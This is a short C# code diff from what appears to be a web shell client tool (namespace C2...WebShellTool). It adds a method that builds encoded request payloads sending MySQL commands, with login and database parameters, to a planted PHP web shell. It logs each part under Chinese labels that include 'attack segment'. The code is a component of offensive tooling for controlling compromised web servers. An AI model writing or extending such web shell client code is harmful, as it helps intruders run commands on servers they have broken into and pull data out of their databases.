@@ -113,7 +113,25 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             return payload;
         }
+        public virtual string GetDatabaseInfo(string loginInfo ,string database ,string command) 
+        {
+            string payload = String.Format("{0}={1}&z1={2}&z2={3}&z3={4}",
+                   prefix,
+                   ST.EncodeUrlBase64(clientSetting.PHP_DB_MYSQL),
+                   loginInfo,
+                   database,
+                   ST.EncodeUrlBase64(command));
 
+            sb.AppendLine("Remote Command:" + command)
+             .AppendLine(payload)
+             .AppendLine(string.Format("引导段:{0}", prefix))
+             .AppendLine(string.Format("攻击段:{0}", clientSetting.PHP_DB_MYSQL))
+             .AppendLine(string.Format("参数一:{0}", loginInfo))
+             .AppendLine(string.Format("参数二:{0}", database))
+             .AppendLine(string.Format("参数三:{0}", command))
+             .AppendLine();
+            return payload;
+        }
         public virtual IClient AppendLog(string msg)
         {
             sb.Append(msg); return this;
